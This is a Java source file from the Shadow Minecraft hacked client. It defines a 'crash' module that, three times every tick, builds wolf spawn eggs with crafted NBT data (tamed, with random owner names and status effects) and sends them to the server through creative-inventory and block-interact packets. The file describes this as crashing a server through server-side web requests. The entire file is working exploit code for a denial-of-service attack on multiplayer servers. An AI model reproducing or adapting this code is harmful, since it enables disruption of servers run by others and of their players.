/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtByte;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

import java.util.Random;

public class SSRFCrash extends Module {

    public SSRFCrash() {
        super("SSRFCrash", "Crash using server side web requests", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        for (int i = 0; i < 3; i++) {
            ItemStack krash = new ItemStack(Items.WOLF_SPAWN_EGG, 1);
            NbtCompound kompound = new NbtCompound();
            NbtCompound kompound2 = new NbtCompound();
            NbtList effects = new NbtList();
            NbtCompound invis = new NbtCompound();
            NbtCompound damage = new NbtCompound();
            damage.put("Id", NbtByte.of((byte) 7));
            damage.put("Amplifier", NbtByte.of((byte) 4));
            damage.put("Duration", NbtInt.of(2000));
            invis.put("Id", NbtByte.of((byte) 14));
            invis.put("Amplifier", NbtByte.of((byte) 4));
            invis.put("Duration", NbtInt.of(2000));
            effects.add(damage);
            effects.add(invis);
            kompound2.put("ActiveEffects", effects);
            kompound2.put("Owner", NbtString.of(rndStr(15)));
            kompound2.put("Tamed", NbtByte.of(true));
            kompound.put("EntityTag", kompound2);
            krash.setNbt(kompound);
            client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, krash));
            try {
                client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(client.player.getPos(), Direction.UP, client.player.getBlockPos(), true)));
            } catch (Exception ignored) {
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }


    private String rndStr(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[] { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }
}
